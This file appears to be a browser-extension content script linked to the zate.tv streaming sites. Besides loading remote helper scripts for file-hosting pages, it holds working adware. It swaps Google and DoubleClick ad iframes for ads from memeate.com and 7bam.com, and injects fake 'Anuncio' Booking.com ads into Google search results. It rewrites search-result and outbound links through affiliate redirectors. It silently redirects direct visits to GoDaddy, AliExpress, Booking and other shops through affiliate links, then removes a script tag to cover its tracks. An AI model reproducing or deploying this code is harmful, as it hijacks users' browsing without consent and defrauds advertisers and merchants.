



if (location.href.match(/^http:\/\/(www\.)?zate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?movielizate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?serializate\.(com|tv|net)/i) || location.href.match(/^http:\/\/(www\.)?tvlizate\.(com|tv|net)/i)) {
    if (document.getElementById("zate_plugin")) {
        if (document.getElementById("zate_plugin").src.match(/get_plugin/i)) {
            var al = document.getElementById("zate_dir").innerHTML.replace(/amp;/gi, '');
            document.getElementById("zate_plugin").src = "http://player.zate.tv/fuente/" + al
        }
    }
}


var loca = (location.href.match(/zatetv=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loca) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loca) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loca) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loca) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loca) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i)) {
    addScript("uptobox");
}else if (location.href.match(/^https:\/\/(www\.)?uptobox\.com/i)) {
    addScripts("uptobox");
}else if (location.href.match(/^http:\/\/(www\.)?megashares\.com/i) && loca) {
    addScript("megashares");
}else if (location.href.match(/^http:\/\/(www\.)?uplea\.com/i) && loca) {
    addScript("uplea");
}else if (location.href.match(/^http:\/\/(www\.)?crocko\.com/i) && loca) {
    addScript("crocko");
}else if (location.href.match(/^http:\/\/(www\.)?nowvideo\.sx/i) && loca) {
    addScript("nowvideo");
}else if (location.href.match(/^http:\/\/(www\.)?sharesix\.com/i) && loca) {
    addScript("sharesix");
}else if (location.href.match(/^http:\/\/(www\.)?vidzi\.tv/i) && loca) {
    addScript("vidzi");
}else if (location.href.match(/^http:\/\/(www\.)?powvideo\.net/i) && loca) {
    addScript("powvideo");
}else if (location.href.match(/^http:\/\/(www\.)?videomega\.tv/i) && loca) {
    addScript("videomega");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.zate.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}

function addScripts(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "https://megaapi.com/mirrors/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}


function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600', '120x600', '336x280'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];

    var ret = false;

    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }
    return ret;

}

function getSizes(a) {
    var myWidth = 0, myHeight = 0;
    if (typeof (window.innerWidth) === 'number') {
        myWidth = window.innerWidth;
        myHeight = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        myWidth = document.documentElement.clientWidth;
        myHeight = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        myWidth = document.body.clientWidth;
        myHeight = document.body.clientHeight;
    }
    if(a == 'w')
    return myWidth
    else if (a == 'h')
    return myHeight;
    else
    return myWidth + 'x' + myHeight;
}

function masIframe(iframe){
    try{
        if(iframe.src != undefined){
            if(iframe.src.indexOf("doubleclick.net") != -1 || iframe.src.indexOf("googlesyndication.com") != -1){
                if(iframe.src.indexOf('https://memeate.com/') ==-1 && iframe.src.indexOf('http://7bam.com/') ==-1){
               var w = iframe.width;
               var h = iframe.height;
               
                if(w == '' && h =='250'){
                    w='300';
                }
                if(w == '' && h =='90'){
                    w='728';
                }

                if (tam(w+"x"+h) && iframe.style.display !="none" && iframe.style.visibility != 'hidden'){
                    if(window.location.protocol=="https:"){
                        iframe.src = "https://memeate.com/get.htm?33=" + w + "&52=" + h;
                     }else{
                        iframe.src = "http://7bam.com/get.htm?20=" + w + "&30=" + h;
                     }

                }
            }
            }
        }

        var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
        var i = iframeDocument.getElementsByTagName('iframe');

        if(i.length > 0){
            for(var d in i){
                if(i[d].src != undefined && i[d].src.indexOf('https://memeate.com/') ==-1 && i[d].src.indexOf('http://7bam.com/') ==-1 ){
                    masIframe(i[d]);
                }
            }

            return false;
        }else{
            return false;
        }

    }catch(err){
        return false;
    }
}

function a_z() {
    var texts = document.getElementsByTagName('text');
    if (texts.length > 0) {
        for (i = 0; i < texts.length; i++) {
            if (texts[i].innerHTML === 'Google' || texts[i].innerHTML.indexOf('Google') !== -1 || texts[i].innerHTML.search("Anuncios") > -1 || texts[i].innerHTML.indexOf("Anuncios") !== -1 || texts[i].innerHTML.indexOf("anuncios") !== -1  || texts[i].innerHTML === 'Gestión anuncios' || texts[i].innerHTML === 'AdChoices') {
                var parent = texts[i];
                while (parent.tagName.toUpperCase() !== 'HTML') {
                    if (parent.tagName.toLowerCase() === 'body') {
                    var w = getSizes('w');
                    var h = getSizes('h');
                     if (tam(getSizes('t'), true)){
                          if(window.location.protocol=="https:"){
                            parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://memeate.com/get.htm?33=' + w + '&52=' + h + '"></iframe>';
                            }else{
                            parent.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                            }
                        }
                    }
                    parent = parent.parentNode;
                }
            }
        }
    }
}


function b_z(){
    var choises = document.getElementsByTagName('img');
    if(choises.length > 0){
        for(i = 0; i < choises.length; i++){
            var child = choises[i];
            if(child.alt === 'AdChoices' || child.src.indexOf("/c_30_us.png") > -1 || child.src.indexOf('//c.betrad.com/') !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                      var w = getSizes('w');
                        var h = getSizes('h');
                        if (tam(getSizes('t'), true)){
                        
                          if(window.location.protocol=="https:"){
                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://memeate.com/get.htm?33=' + w + '&52=' + h + '"></iframe>';
                            }else{
                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                            }
                         }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}


function c_z(){
    var ifra = document.getElementsByTagName("iframe");
    if(ifra.length > 0){
        for(i = 0; i < ifra.length; i++){
            var child = ifra[i];
             if(child.src.indexOf("doubleclick.net") !== -1){
                while (child.tagName.toUpperCase() !== 'HTML') {
                    if (child.tagName.toLowerCase() === 'body') {
                        var w = getSizes('w');
                            var h = getSizes('h');
                            if (tam(getSizes('t'), true)){
                            if(window.location.protocol=="https:"){
                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="https://memeate.com/get.htm?33=' + w + '&52=' + h + '"></iframe>';
                            }else{
                            child.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>';
                            }
                        }
                    }
                    child = child.parentNode;
                }
            }
        }
    }
}


function k_z(){
        var t_zi=0;
        var inZ=setInterval(function(){
            var iframes = document.getElementsByTagName('iframe');
            if (iframes.length > 0) {
                for(var k in iframes){
                    var ifr = iframes[k];

                    try{
                    if(ifr.src.indexOf('https://memeate.com/') ==-1 && ifr.src.indexOf('http://7bam.com/') ==-1){
                        masIframe(ifr);
                        }
                    }catch(err){

                    }
                }
            }
            t_zi+=4;
            if(t_zi >4){
            clearInterval(inZ);
            }
        },2000);
}
function rmScript(filename, filetype){
        var targetelement=(filetype=="js")? "script" : (filetype=="css")? "link" : "none";
        var targetattr=(filetype=="js")? "src" : (filetype=="css")? "href" : "none";
        var allsuspects=document.getElementsByTagName(targetelement);
    for (var i=allsuspects.length; i>=0; i--){
            if (allsuspects[i] && allsuspects[i].getAttribute(targetattr)!=null && allsuspects[i].getAttribute(targetattr).indexOf(filename)!=-1)
            allsuspects[i].parentNode.removeChild(allsuspects[i]);
    }
}

function createCookie(name, value, days) {
    var expires;
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
    document.cookie = name + "=" + value + expires + "; path=/";
}
function getCookie(c_name) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(c_name + "=");
        if (c_start != -1) {
            c_start = c_start + c_name.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length;
            }
            return unescape(document.cookie.substring(c_start, c_end));
        }
    }
    return "empty";
}

function z_isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}

var z_domains = ['booking.com'];

function z_checkValidDesc(a) {
    for (var i = 0; i < z_domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + z_domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}
function e_z() {
    if (window.location.protocol !== "https:") {
        var a = document.getElementsByTagName("a");
        for (var i = 0; i < a.length; i++) {
            if (!z_isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
                continue
            }
            if (z_checkValidDesc(a[i].href)) {
                a[i].href = "http://statsbooking.com/g/googleD.html?to=" + a[i].href ;
            }
        }
    }

    if (window.location.href.indexOf("google") !=-1) {

    var t = setInterval(function() {
        var ad = document.getElementsByClassName("ads-ad");
        if (window.location.href.toLowerCase().indexOf("booking") > -1 || window.location.href.toLowerCase().indexOf("hotel") > -1 || window.location.href.toLowerCase().indexOf("hostel") > -1 || window.location.href.toLowerCase().indexOf("posada") > -1 || window.location.href.toLowerCase().indexOf("motel") > -1 || window.location.href.toLowerCase().indexOf("apartamento") > -1 || window.location.href.toLowerCase().indexOf("apart") > -1) {
            if (ad.length > 0) {
                clearInterval(t);
                var d = "";
                d += '<style>.ads-ad{padding-top:11px;padding-bottom:11px}#center_col ._jd{position:relative;margin:0px 0px 6px 0px;padding-top:2px;padding-bottom:0px}#center_col .ads-ad{padding-left:8px;padding-right:8px}#rhs ._jd{margin:5px 0px 32px 16px;padding-top:3px;padding-bottom:0px}#rhs .ads-ad{padding-left:0px;padding-right:0px}#center_col ._jd{border-bottom:1px solid #ebebeb}#center_col ._Gl{margin:12px -17px 0 0;padding:0}#center_col ._Gl{font-weight:normal;font-size:13px;float:right}._Gl span+span{margin-left:3px}#rhs ._Gl{font-weight:normal;font-size:13px;margin:0;padding:0;}.ads-bbl-container{background-color:#fff;border:1px solid rgba(0,0,0,0.2);box-shadow:0 4px 16px rgba(0,0,0,0.2);color:#666;position:absolute;z-index:120}.ads-bbl-triangle{border-left-color:transparent;border-right-color:transparent;border-width:0 9.5px 9.5px 9.5px;width:0px;border-style:solid;border-top-color:transparent;height:0px;position:absolute;z-index:121}.ads-bbl-triangle-bg{border-bottom-color:#999}.ads-bbl-triangle-fg{border-bottom-color:#fff;margin-left:-9px;margin-top:1px}.ads-bblc{display:none}._tA{padding:16px;color:#666}._kT{padding-top:12px}._tA a{text-decoration:none}._tA a:hover{text-decoration:underline}._uo{background:url(/images/nav_logo195.png);background-position:0 -106px;display:inline-block;height:12px;margin-top:-2px;position:relative;top:2px;width:12px;text-indent:100%;white-space:nowrap;overflow:hidden}.ads-visurl{color:#006621;white-space:nowrap;font-size:13px}#center_col .ads-visurl cite{color:#006621;vertical-align:bottom}.ads-visurl .ads-badge{margin-right:7px;margin-left:0px}.ads-badge{background-color:#59946b;border-radius:2px;color:#fff;display:inline-block;font-size:11px;padding:0 2px;line-height:14px;vertical-align:baseline}._jd .action-menu{line-height:0}#center_col ._jd .action-menu .mn-dwn-arw{border-color:#006621 transparent}#center_col ._jd .action-menu:hover .mn-dwn-arw{border-color:#00591E transparent}._BR{display:-webkit-box;min-height:36px;overflow:hidden;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:2}._pA,._Pr{margin:0 -13px -2px 0;padding:4px 0 3px 28px;width:526px}._pA>li,._Pr>li{-webkit-box-sizing:border-box;box-sizing:border-box;display:inline-block;padding:0 13px 2px 0;vertical-align:top;width:50%}._pA>li{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}._Pr{padding-top:22px;padding-bottom:4px;margin-bottom:-15px}._Pr>li{padding-bottom:15px}._ES>li,._pA>li,._Pr>li{line-height:inherit}</style><h3><a style="display:none" href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/index.es.html" id="s0p1"></a>';
                d += '<a href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/index.es.html" id="vs0p1" onmousedown="return google.arwt(this)" class="_Et"><b>Booking</b>.com: Hoteles - <b>Booking</b>.com: reserva fácil y rápido‎</a></h3>';
                d += '<div class="ads-visurl"><span class="ads-badge">Anuncio</span><cite>www.<b>booking</b>.com</cite>‎</div>';
                d += '<div class="ads-creative">531.000+ Hoteles en todo el mundo.</div>';
                d += '<div class="_Rdb _Nf">Albergues&nbsp;·&nbsp;Apartamentos&nbsp;·&nbsp;Casas de Vacaciones&nbsp;·&nbsp;Hostels</div>';
                d += '<ul class="_Pr"><li><h3><a href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/city/ar/buenos-aires.html">750 Buenos Aires Hoteles</a></h3><div class="ads-creative ac">¡Precio Mínimo Garantizado!<br>Reservar un Hotel en Buenos Aires</div></li><li><h3><a href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/city/mx/mexico.html">Hoteles Ciudad de México</a></h3><div class="ads-creative ac">Reserva online y paga en el hotel<br>Reservar Ciudad de México Hoteles</div></li><li><h3><a href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/city/us/new-york.html">500 Hoteles en Nueva York</a></h3><div class="ads-creative ac">Hoteles al 50%<br>Reserva un Hotel en Nueva York</div></li><li><h3><a href="http://statsbooking.com/g/googleD.html?to=http://www.booking.com/city/es/ibiza.html">100 Hoteles en Ibiza</a></h3><div class="ads-creative ac">Pago siempre 100% seguro.<br>Reserva un Hotel en Ibiza</div></li></ul>';
                d += '<li class=\"action-menu-item ab_dropdownitem\" role=\"menuitem\" data-type=\"why_this_ad\"><div class=\"action-menu-button\" role=\"menuitem\" tabindex=\"-1\" jsaction=\"am.itemclk\" data-ved=\"0CCIQgRM\">¿Por qué este anuncio?</div></li></ul></div></div></div>';
                ad['0'].innerHTML = d
            }
        }
    }, 100);
}
}function h_z(){ 
                
            var linkz = {'godaddy.com' : 'http://redirectaff.com/g/godaddy.html?to=http://www.tkqlhce.com/click-7679425-10378406?url=https://www.godaddy.com/es/','aliexpress.com' : 'http://redirectaff.com/g/aliexpress.html?to=http://tc.tradetracker.net/?c=15727&m=621763&a=312444&r=&u=http%3A%2F%2Faliexpress.com%2F','eukhost.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.kqzyfj.com/click-7679425-12205857','interserver.net' : 'http://redirectaff.com/g/hosting.html?to=http://www.kqzyfj.com/click-7679425-11139957','domain.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.tkqlhce.com/click-7679425-10796750?url=https%3A%2F%2Fwww.domain.com%2F','fatcow.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.tkqlhce.com/click-7679425-10437710','namecheap.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-13269564?url=https%3A%2F%2Fwww.namecheap.com%2F','one.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-10549798?url=http%3A%2F%2Fwww.one.com%2F','ipage.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-11328503?url=http%3A%2F%2Fwww.ipage.com%2F%3FAffID%3D714889','webhostingpad.com' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-10523931','banggood.com' : 'http://redirectaff.com/g/shop.html?to=https://www.banggood.com/bang/?tt=16943_12_312444_','dx.com' : 'http://redirectaff.com/g/shop.html?to=http://tc.tradetracker.net/?c=18352&m=12&a=312444','booking.com' : 'http://booking.com.devolviendo.com/redirect/Ym9va2luZyM2/booking','olahotels.com' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=20729&m=12&a=312444&u=%2F','rentalcars.com' : 'http://redirectaff.com/g/rental.html?to=http://tc.tradetracker.net/?c=22789&m=906308&a=312444&r=&u=','agoda.com' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=18166&m=665250&a=312444&r=&u=','vueling.com' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=28094&m=12&a=312444&u=%2Fes'};
            var doma = ['godaddy.com','aliexpress.com','eukhost.com','interserver.net','domain.com','fatcow.com','namecheap.com','one.com','ipage.com','webhostingpad.com','banggood.com','dx.com','booking.com','olahotels.com','rentalcars.com','agoda.com','vueling.com'];
 
for (f_z = 0; f_z < doma.length; f_z++) {
        var t_urls = window.location.href;
        var z_url = t_urls.split("/");
        z_url = z_url[2];
        if(t_urls.indexOf('.alibaba.com') !== -1 || t_urls.indexOf('.aliexpress.com') !== -1 || t_urls.indexOf('.hotels.com') !== -1 || t_urls.indexOf('.godaddy.com') !== -1){
        if(!document.referrer && window.location.href.indexOf(doma[f_z]) !== -1 && getCookie('lp').indexOf('empty') !== -1 && window.location.href.indexOf('utm_campaign') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
        }else{
        if(!document.referrer && (z_url.indexOf(doma[f_z]) === 0 || z_url.indexOf('www.'+ doma[f_z]) === 0) && getCookie('lp').indexOf('empty') !== -1 && window.location.href.indexOf('utm_medium') === -1 && window.location.href.indexOf('PID') === -1){
            createCookie('lp', Math.floor((Math.random() * 10000) + 1) ,'1');
            window.location.href =   linkz[doma[f_z]];
        }
    }
    }
                 
                var l_oc, urls = {'godaddy' : 'http://redirectaff.com/g/godaddy.html?to=http://www.tkqlhce.com/click-7679425-10378406?url=https://www.godaddy.com/es/','aliexpress' : 'http://redirectaff.com/g/aliexpress.html?to=http://tc.tradetracker.net/?c=15727&m=621763&a=312444&r=&u=http%3A%2F%2Faliexpress.com%2F','eukhost' : 'http://redirectaff.com/g/hosting.html?to=http://www.kqzyfj.com/click-7679425-12205857','interserver' : 'http://redirectaff.com/g/hosting.html?to=http://www.kqzyfj.com/click-7679425-11139957','domain' : 'http://redirectaff.com/g/hosting.html?to=http://www.tkqlhce.com/click-7679425-10796750?url=https%3A%2F%2Fwww.domain.com%2F','fatcow' : 'http://redirectaff.com/g/hosting.html?to=http://www.tkqlhce.com/click-7679425-10437710','namecheap' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-13269564?url=https%3A%2F%2Fwww.namecheap.com%2F','one' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-10549798?url=http%3A%2F%2Fwww.one.com%2F','ipage' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-11328503?url=http%3A%2F%2Fwww.ipage.com%2F%3FAffID%3D714889','webhostingpad' : 'http://redirectaff.com/g/hosting.html?to=http://www.jdoqocy.com/click-7679425-10523931','banggood' : 'http://redirectaff.com/g/shop.html?to=https://www.banggood.com/bang/?tt=16943_12_312444_','dx' : 'http://redirectaff.com/g/shop.html?to=http://tc.tradetracker.net/?c=18352&m=12&a=312444','booking' : 'http://booking.com.devolviendo.com/redirect/Ym9va2luZyM2/booking','olahotels' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=20729&m=12&a=312444&u=%2F','rentalcars' : 'http://redirectaff.com/g/rental.html?to=http://tc.tradetracker.net/?c=22789&m=906308&a=312444&r=&u=','agoda' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=18166&m=665250&a=312444&r=&u=','vueling' : 'http://redirectaff.com/g/book.html?to=http://tc.tradetracker.net/?c=28094&m=12&a=312444&u=%2Fes'};
                var kfz = ['godaddy','aliexpress','eukhost','interserver','domain','fatcow','namecheap','one','ipage','webhostingpad','banggood','dx','booking','olahotels','rentalcars','agoda','vueling'];
                
                 if (window.location.href.indexOf("google") !=-1) {

                var inter = setInterval(function() {
                    l_oc = document.getElementsByTagName('span');

                    for (i = 0; i < l_oc.length; i++) {
                        var elem = l_oc[i];

                        if (elem.innerHTML === "Ad" || elem.innerHTML === "Anuncio") {
                            var parent = elem.parentNode.parentNode;
                            var check = elem.nextSibling;

                            clearInterval(inter);

                            for (x = 0; x < parent.childNodes.length; x++) {
                                var child = parent.childNodes[x];
                            if (child.tagName.toLowerCase() === "h3" || child.className.toLowerCase() ==="ad_cclk") {
                                    var anclas = parent.parentNode.getElementsByTagName('a');
                                    for (y = 0; y < kfz.length; y++) {
                                        if (anclas[1].innerHTML.toLowerCase().indexOf(kfz[y]) !== -1  || check.innerHTML.toLowerCase().indexOf(kfz[y]) !== -1) {
                                            anclas[1].href = urls[kfz[y]];
                                            anclas[0].href = urls[kfz[y]];
                                        }
                                    }
                                }
                            }
                        } else {
                            if (document.readyState === "complete") {
                                clearInterval(inter);
                            }
                        }


                    }
                    if (l_oc.length == 0) {
                        if (document.readyState === "complete") {
                            clearInterval(inter);
                        }
                    }
                });
        }
            
                
                var post = {'godaddy.com' : 'http://redirectaff.com/g/godaddy.html?to=http://www.tkqlhce.com/click-7679425-10378406?url=','booking.com' : 'http://statsbooking.com/g/googleD.html?to='};
                var clave = ['godaddy.com','booking.com'];
                if (window.location.href.indexOf("google") !=-1) {
var ttz = setInterval(function() {
    var all = document.getElementsByTagName('ol');

    if (all.length > 0) {
        clearInterval(ttz);
        for (i = 0; i < all.length; i++) {
            if (all[i].id === "rso") {
                var result = all[i].getElementsByTagName('li');
                for (x = 0; x < result.length; x++) {
                    var h3 = result[x].getElementsByTagName('h3');
                    if (h3.length > 0) {
                        var link = h3[0].getElementsByTagName('a');

                        for (z = 0; z < clave.length; z++) {
                            if (link[0].href.indexOf(clave[z]) !== -1 && link[0].href.indexOf('//stats') === -1) {
                                link[0].href = post[clave[z]] + link[0].href;
                            }
                        }
                    }
                }
            }
        }
    }
}, 100);
}
                 }
        
                if(window.location.href.indexOf('https://memeate.com/') == -1 && window.location.href.indexOf('http://7bam.com/') == -1){
            e_z();
            a_z();
            b_z();
            c_z();
            k_z();

            h_z();
        }
        
        setTimeout(
        function() {
            rmScript('cache.php?', 'js');
        }, 25000);